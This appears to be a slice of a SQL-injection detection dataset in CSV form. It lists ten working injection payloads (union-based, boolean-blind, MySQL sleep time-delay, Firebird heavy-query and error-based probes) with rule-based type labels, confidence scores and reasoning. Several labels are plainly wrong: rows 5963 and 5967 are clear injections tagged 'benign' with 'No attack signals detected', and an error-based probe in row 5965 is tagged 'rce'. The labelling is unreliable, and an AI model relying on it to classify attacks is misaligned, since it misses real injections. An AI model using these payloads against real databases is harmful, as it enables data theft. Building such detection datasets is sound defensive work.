row_index,payload_norm,label,sqli_type_hint,sqli_type,db_engine,confidence,reasoning,label_source
5960,"1' or 7552 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) and 'yhkr' = 'yhkr",1,,heavy_query,firebird,0.95,"select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb detected — heavy_query injection (priority 6) on firebird",rule-based
5961,"-4205' union all select 8986,8986,8986,8986,8986,8986,8986,8986,8986,8986#",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
5962,"1"" where 7158 = 7158",1,,benign,generic,0.8,No attack signals detected in payload,rule-based
5963,"1"" ) ) ) or char ( 75 ) ||char ( 70 ) ||char ( 99 ) ||char ( 83 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",1,,benign,generic,0.8,No attack signals detected in payload,rule-based
5964,1 where 3735 = 3735,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
5965,"1 or ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 8113 = 8113,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) ) # lgoz",1,,rce,generic,0.95,0x7171706a71 detected — rce injection (priority 1) on generic,rule-based
5966,"1%"" ) ) and 9198 = 9198--",1,,benign,generic,0.8,No attack signals detected in payload,rule-based
5967,"1, ( cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 7823 = 7823 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) )",1,,benign,generic,0.8,No attack signals detected in payload,rule-based
5968,"1'|| ( select 'uvbb' where 7795 = 7795 or char ( 117 ) ||char ( 111 ) ||char ( 105 ) ||char ( 100 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) ) ||'",1,,boolean_blind,generic,0.95,7795 = 7795 or detected — boolean_blind injection (priority 8) on generic,rule-based
5969,( select * from ( select ( sleep ( 5 ) ) ) srmq ) and ( ( ( 'ksoc' = 'ksoc,1,,time_blind,mysql,0.95,sleep ( is MySQL-specific time-delay function — time-based blind inference (priority 5),rule-based
